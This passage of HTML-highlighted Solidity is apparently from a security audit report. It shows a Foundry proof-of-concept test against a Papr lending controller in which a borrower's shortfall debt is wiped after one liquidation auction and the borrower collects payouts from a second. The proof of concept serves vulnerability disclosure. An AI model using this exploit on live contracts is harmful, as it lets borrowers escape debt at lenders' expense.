class=\"mtk12\">minOut</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">3</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> ++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">purchaser</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10</span><span class=\"mtk1\">+</span><span class=\"mtk12\">i</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">purchaser</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">), </span><span class=\"mtk7\">10</span><span class=\"mtk1\">+</span><span class=\"mtk12\">i</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeTransferReceivedArgs</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// purchaser now has 4.4... papr</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk11\">assertGt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">debtToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">purchaser</span><span class=\"mtk1\">), </span><span class=\"mtk7\">4.4e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// make max loan liquidatable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">priceKind</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ReservoirOracleUnderwriter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">PriceKind</span><span class=\"mtk1\">.</span><span class=\"mtk12\">TWAP</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getOracleInfoForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testPoC</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">purchaser</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">debtToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// start auction1, collateralId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getOracleInfoForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">auction1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startLiquidationAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// nobody purchage auction1 for some reason(like nft price falling)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// start auction2, collateralId+1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">liquidationAuctionMinSpacing</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getOracleInfoForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">auction2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startLiquidationAuction</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk11\">Collateral</span><span class=\"mtk1\">({</span><span class=\"mtk12\">id:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">addr:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">}),  </span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">VaultInfo</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">info</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vaultInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk11\">assertGt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">info</span><span class=\"mtk1\">.</span><span class=\"mtk12\">debt</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2.99e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// purchase auction1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">beforeBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">debtToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">auctionCurrentPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">penalty</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">liquidationPenaltyBips</span><span class=\"mtk1\">() / </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reduced</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">penalty</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shortfall</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">info</span><span class=\"mtk1\">.</span><span class=\"mtk12\">debt</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">reduced</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// burn penalty</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectEmit</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">penalty</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// reduce debt (partial)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectEmit</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ReduceDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reduced</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectEmit</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">reduced</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">//!! burning the shortfall debt not covered by auction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectEmit</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ReduceDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shortfall</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getOracleInfoForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">purchaseLiquidationAuctionNFT</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">purchaser</span><span class=\"mtk1\">, </span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// reduced: 0.65..</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk11\">assertLt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reduced</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0.66e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// fortfall: 2.34..</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk11\">assertGt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shortfall</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2.34e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">//!! debt is 0 now</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">info</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vaultInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">info</span><span class=\"mtk1\">.</span><span class=\"mtk12\">debt</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// purchase auction2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// https://www.wolframalpha.com/input?i=solve+3+%3D+8.999+*+0.3+%5E+%28x+%2F+86400%29</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">78831</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">beforeBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">debtToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">auctionCurrentPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">penalty</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">liquidationPenaltyBips</span><span class=\"mtk1\">() / </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payouts</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">penalty</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// burn penalty</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectEmit</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">penalty</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">//!! reduce 0 because debt is 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectEmit</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ReduceDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectEmit</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">//!! borrower get the payouts that should be used to reduce the shortfall debt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectEmit</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">), </span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payouts</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getOracleInfoForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">purchaseLiquidationAuctionNFT</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">purchaser</span><span class=\"mtk1\">, </span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">//!! borrower wins</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">afterBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">debtToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">afterBalance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">beforeBalance</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payouts</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk11\">assertGt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">payouts</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2.4e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_addCollaterals</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span 